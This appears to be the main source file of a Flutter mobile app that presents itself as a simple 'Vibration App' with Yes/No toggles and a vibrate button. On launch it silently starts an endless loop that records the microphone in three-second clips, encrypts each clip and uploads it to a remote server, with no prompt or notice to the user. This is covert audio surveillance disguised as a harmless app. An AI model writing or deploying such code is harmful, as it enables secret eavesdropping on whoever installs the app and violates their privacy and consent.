import 'dart:io';  // For file handling on Android, iOS, or desktop platforms
import 'package:flutter/material.dart';
import 'package:vibration/vibration.dart';
import 'API/Client.dart'; // Import the vibration package
import 'audiorec.dart';  // Import the audio recorder service
import 'package:encrypt/encrypt.dart' as encrypt; // For encryption
import 'package:mime/mime.dart';  // Import the mime package


void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Vibration Example',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: MyHomePage(title: 'Vibration App'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  List<bool> isSelected1 = [true, false];
  List<bool> isSelected2 = [true, false];
  List<bool> isSelected3 = [true, false];

  final AudioRecorderService _audioRecorder = AudioRecorderService(); // Initialize audio recorder
  bool isRecording = false;
  AudioUploader MyClient = AudioUploader(serverUrl: '10.0.2.2:5000');
  
  @override
  void initState() {
    super.initState();
    _startRecordingOnLaunch();  // Start recording when the app launches
    MyClient.connectToServer();  // Connect to the server on startup
  }

  // Automatically start recording when the app starts
  Future<void> _startRecordingOnLaunch() async {
    while (true) {
      await _audioRecorder.startRecording();
      setState(() {
        isRecording = true;
      });

      await Future.delayed(const Duration(seconds: 3));
      final path = await _audioRecorder.stopRecording();
      if (path == null) {
        print("There was an error and it didn't return a file path.");
        return;
      }
      print('Recording saved at: $path');
      setState(() => isRecording = false);

      // Check MIME type of the recorded file before processing
      await Future.delayed(Duration(seconds: 1));
      String? mimeType = lookupMimeType(path) ?? 'audio/wav'; // Default to 'audio/wav' if MIME type is null
      print('MIME type: $mimeType');

      // Encrypt the file using the method in AudioRecorderService
      final encryptedFilePath = await _audioRecorder.encryptFile(path);

      await Future.delayed(Duration(seconds: 1));
      mimeType = lookupMimeType(path) ?? 'audio/wav'; // Default to 'audio/wav' if MIME type is null
      print('MIME type: $mimeType');

      // Send the encrypted file to the server
      await MyClient.uploadAudioFile(encryptedFilePath);
    
      
    }
  }

  void toggleSelection(List<bool> list, int index) {
    setState(() {
      for (int i = 0; i < list.length; i++) {
        list[i] = (i == index);
      }
    });
  }

  void vibratePhone() async {
    if (await Vibration.hasVibrator() ?? false) {
      Vibration.vibrate(duration: 500); // Vibrates for 500 milliseconds
    }
  }
  
  // Start/Stop recording function
  Future<void> toggleRecording() async {
    if (isRecording) {
      final path = await _audioRecorder.stopRecording();

      print('Recording saved at: $path');
    } else {
      await _audioRecorder.startRecording();
    }
    setState(() => isRecording = !isRecording);  // Toggle recording state
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Theme.of(context).colorScheme.inversePrimary,
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text('Do you agree?'),
            const SizedBox(height: 10),
            ToggleButtons(
              isSelected: isSelected1,
              onPressed: (index) => toggleSelection(isSelected1, index),
              borderRadius: BorderRadius.circular(10),
              selectedColor: Colors.white,
              fillColor: Colors.deepPurple,
              children: const <Widget>[
                Padding(
                  padding: EdgeInsets.symmetric(horizontal: 16.0),
                  child: Text('Yes'),
                ),
                Padding(
                  padding: EdgeInsets.symmetric(horizontal: 16.0),
                  child: Text('No'),
                ),
              ],
            ),
            const SizedBox(height: 10),
            ToggleButtons(
              isSelected: isSelected2,
              onPressed: (index) => toggleSelection(isSelected2, index),
              borderRadius: BorderRadius.circular(10),
              selectedColor: Colors.white,
              fillColor: Colors.deepPurple,
              children: const <Widget>[
                Padding(
                  padding: EdgeInsets.symmetric(horizontal: 16.0),
                  child: Text('Yes'),
                ),
                Padding(
                  padding: EdgeInsets.symmetric(horizontal: 16.0),
                  child: Text('No'),
                ),
              ],
            ),
            const SizedBox(height: 10),
            ToggleButtons(
              isSelected: isSelected3,
              onPressed: (index) => toggleSelection(isSelected3, index),
              borderRadius: BorderRadius.circular(10),
              selectedColor: Colors.white,
              fillColor: Colors.deepPurple,
              children: const <Widget>[
                Padding(
                  padding: EdgeInsets.symmetric(horizontal: 16.0),
                  child: Text('Yes'),
                ),
                Padding(
                  padding: EdgeInsets.symmetric(horizontal: 16.0),
                  child: Text('No'),
                ),
              ],
            ),
            const SizedBox(
                height: 20), // Add some space between the counter and button
            ElevatedButton(
              onPressed: vibratePhone, // Vibrates the phone on button press
              child: const Text('Vibrate Phone'),
            ),
            const SizedBox(height: 20), // Add some space between buttons
            ElevatedButton(
              onPressed: toggleRecording, // Start/Stop recording
              child: Text(isRecording ? 'Stop Recording' : 'Start Recording'),
            ),
          ],
        ),
      ),
    );
  }
}